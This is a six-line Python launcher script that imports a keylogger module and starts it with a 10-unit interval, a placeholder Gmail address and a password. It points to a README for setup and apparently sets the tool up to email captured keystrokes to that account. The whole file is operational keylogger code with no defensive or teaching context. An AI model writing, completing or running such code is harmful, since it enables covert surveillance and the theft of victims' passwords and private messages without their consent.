#!/usr/bin/env python
import keylogger

# See README file for clarification on what to enter here
my_keylogger = keylogger.Keylogger(10, "your_email@gmail.com", "your_email_password")
my_keylogger.start()